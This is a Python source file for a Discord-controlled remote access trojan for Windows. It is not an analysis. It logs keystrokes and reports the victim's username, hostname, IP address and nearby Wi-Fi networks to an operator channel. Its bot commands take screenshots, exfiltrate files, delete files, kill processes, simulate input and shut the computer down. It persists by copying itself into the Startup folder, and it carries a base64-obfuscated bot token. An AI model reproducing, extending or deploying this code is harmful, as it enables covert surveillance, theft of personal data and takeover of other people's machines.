import tkinter.messagebox
import discord, os, socket, base64, subprocess, pyautogui, tkinter, random, webbrowser, string, keyboard, time, winsound
from pynput import keyboard as kb
from discord.ext import commands
from os import listdir
from pathlib import Path



base64_string = "TVRJM016TTRNalV3TVRjeU5EY3hOekUyTmcuR0t1WFZGLkZIcVh5XzdZejBjZzlkcXI4V194N19jMERTRzVVRDVVRmtrQkhv"
base64_bytes = base64_string.encode("ascii")

sample_string_bytes = base64.b64decode(base64_bytes)
sample_string = sample_string_bytes.decode("ascii")

bot = commands.Bot(command_prefix="!",intents=discord.Intents.all())

user = os.getlogin()
hst = socket.gethostname()
i1p = socket.gethostbyname(hst)
devices = subprocess.check_output(['netsh','wlan','show','network']) 
  
# decode it to strings 
devices = devices.decode('mbcs') 
devices= devices.replace("\r","")
datastr = ""

def keyPressed(key):
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print()


if __name__ == "__main__":
    listener = kb.Listener(on_press=keyPressed)
    listener.start()


def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))



@bot.event
async def on_ready():
    channel = bot.get_channel(1278482409029111908)
    logs = bot.get_channel(1278750914014089217)
    await logs.send(i1p)
    await channel.send(f"<@1259930742407036929> New Session opened!")
    await channel.send(f"Username: {user}\nPC Name/Host: {hst}\n**=================**\nNetwork Devices: {devices}")

@bot.command()
async def cmds(ctx):
    embed1 = discord.Embed(title="Aviable Commands", description="""
!altf4 *(delay)* ~ alt4´s client
!asa ~ copies program into clients autostart folder **(<@&1278836817227022447> required)**
!click (l/r) *(x)* *(y)* ~ left/rightclicks on clients computer
!cmds ~ lets you see all commands
!cf (directory + filename) ~ creates a new file in a directory on clients computer
!crf (directory) *(amount)* ~ creates random-names files in a directory on clients computer
!df (directory) (filename) ~ deletes chosen file from directory on clients computer
!download (dircetory+file) ~ download clients files
!et (task) ~ ends a task on clients computer
!getkeys ~ sends a text file with all latest key presses
!ip ~ shows the ip of the client **(<@&1278761716640907304> required)**
!of (directory + file) ~ opens a file on clients computer
!ol (link) *(amount)* ~ opens a link in cleints standart webbrowser
!pk (key) *(delay)* ~ presses a key on clients computer
!sc ~ stops program on clients computer
!shutdown *(delay)*~ turns off clients computer **(<@&1278836817227022447> required)**
!ss ~ takes a screenshot of the clients screen
!view (location) ~ lets you view clients files (to see all possible directories type "./" as location)

**WIP (all of these require <@&1278840994019676302>):**

!beep (freqency) (duration) ~ makes a beep noise on clients computer
!message (title) (text) *(amount)* ~ lets an emergency message pop up on clients screen
!rbeep ~ beeps a random amount of times in random frequencies

**All commands in the "WIP" section will freeze the program until the action is done. It is not recommended to use any of these.**


""")
    await ctx.send(embed=embed1)

@bot.command()
@commands.has_role(1278836817227022447) # full access
async def shutdown(ctx, delay):
    if delay:
        if int(delay) < 15:
            await ctx.send("Shutting down clients computer...")
            os.system(f"shutdown /s /t {delay}")

    else:
        await ctx.send("Shutting down clients computer...")
        os.system(f"shutdown /s /t 1")


@bot.command()
@commands.has_role(1278759537867751454) # normal access
async def getkeys(ctx):
    await ctx.send(file=discord.File("keyfile.txt"))
    os.remove("keyfile.txt")


@bot.command()
@commands.has_role(1278759537867751454)
async def click(ctx, lr, *args):
    if lr == "l":
        if args:
            pyautogui.leftClick(int(args[0]), int(args[1]))
        else:
            pyautogui.leftClick()
    if lr == "r":
        if args:
            pyautogui.rightClick(int(args[0]), int(args[1]))
        else:
            pyautogui.rightClick()

@bot.command()
@commands.has_role(1278759537867751454)
async def df(ctx, location, name):
    os.remove(f"C:\\Users\\{user}\\{location}\\" + name)
    await ctx.send("Removed " + name + " from " + location + ".")

@bot.command()
@commands.has_role(1278759537867751454)
async def et(ctx,task):
    os.system("taskkill /f /im " + task)
    await ctx.send("Ended " + task)

@bot.command()
@commands.has_role(1278759537867751454)
async def view(ctx,location):
    home = str(Path.home())
    myPath = os.path.join(home, location)
    data = os.listdir(myPath)
    datastr = ""
    for i in range(len(data)):
        datastr = datastr + "\n" + data[i]
    
    await ctx.send(f"**Data in Folder {location}:** \n\n" + datastr)

@bot.command()
@commands.has_role(1278759537867751454)
async def altf4(ctx, *delay):
    if delay:
        time.sleep(int(delay[0]))
    keyboard.press_and_release("Alt+F4")
    await ctx.send("AltF4´d client.")


@bot.command()
@commands.has_role(1278759537867751454)
async def pk(ctx, key, *delay):
    if delay:
        time.sleep(int(delay[0]))
    keyboard.press_and_release(key)
    await ctx.send("Pressed " + key + ".")

@bot.command()
@commands.has_role(1278759537867751454)
async def cf(ctx,location):
    home = str(Path.home())
    myPath = os.path.join(home, location)
    file = open(myPath,"a")
    file.close
    await ctx.send("Created file.")

@bot.command()
@commands.has_role(1278759537867751454)
async def crf(ctx, dir, *amt):
    home = str(Path.home())
    myPath = os.path.join(home, dir)
    var = id_generator()
    if amt:
        for i in range(int(amt[0])):
            file = open(myPath + "/" + var,"a")
            file.close()
            var = id_generator()
        await ctx.send(f"Generated {amt[0]} random-named file in {dir}.")
    else:
        file = open(myPath + "/" + var,"a")
        file.close()
        await ctx.send(f"Generated 1 random-named file in {dir}.")

@bot.command()
@commands.has_role(1278836817227022447)
async def asa(ctx):
    with open("Anproti.py","r") as self:
        text = self.read()

    with open("C:\\users\\" + user + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.py",'a') as f:
        f.write(text)
        f.close()
    await ctx.send("Added program to the autostart folder.")

@bot.command()
@commands.has_role(1278759537867751454)
async def of(ctx, location):
    home = str(Path.home())
    print(home + location)
    os.startfile(f"{home}\\{location}")
    await ctx.send("Opened file.")


@bot.command()
@commands.has_role(1278759537867751454)
async def ol(ctx, link, *amt):
    if amt:
        for i in range(int(amt[0])):
            webbrowser.open(link)
        await ctx.send(f"Opened {link} {amt[0]} times.")
    else:
        webbrowser.open(link)
        await ctx.send(f"Opened {link} 1 time.")

@bot.command()
@commands.has_role(1278759537867751454)
async def sc(ctx):
    await ctx.send("Stopping all connections...")
    exit()

@bot.command()
@commands.has_role(1278759537867751454)
async def download(ctx,location):
    home = str(Path.home())
    myPath = os.path.join(home, location)
    await ctx.send(file=discord.File(myPath))

@bot.command()
@commands.has_role(1278759537867751454)
async def ss(ctx):
    pyautogui.screenshot("temp.png")
    await ctx.send(file=discord.File("temp.png"))

@bot.command()
@commands.has_role(1278840994019676302)
async def message(ctx,title,text1,*amt):
    text = text1.replace("-"," ")
    if amt:
        for i in range(int(amt[0])):
            tkinter.messagebox.showwarning(title, text) 
        await ctx.send("Sent messages.")
    else:
        tkinter.messagebox.showwarning(title, text) 
        await ctx.send("Sent message.")

@bot.command()
@commands.has_role(1278840994019676302)
async def beep(ctx,freq,dur):
    winsound.Beep(int(freq), int(dur)*1000)
    await ctx.send("Beeeeep")

@bot.command()
@commands.has_role(1278840994019676302)
async def rbeep(ctx):
    freq = random.randint(150,2500)
    dur = random.randint(1,3)
    times = random.randint(20,50)
    for i in range(times):
        winsound.Beep(int(freq), int(dur)*250)
        freq = random.randint(150,2500)
    await ctx.send(f"Beeeeep Beep ({times})")

@bot.command()
@commands.has_role(1278761716640907304)
async def ip(ctx):
    host = socket.gethostname()
    ip1 = socket.gethostbyname(host)
    await ctx.send(f"The client has the IP: {ip1}")

@bot.command()
@commands.has_role(1278759537867751454)
async def purge(ctx):
    channel = ctx.channel
    await channel.purge()


bot.run(sample_string)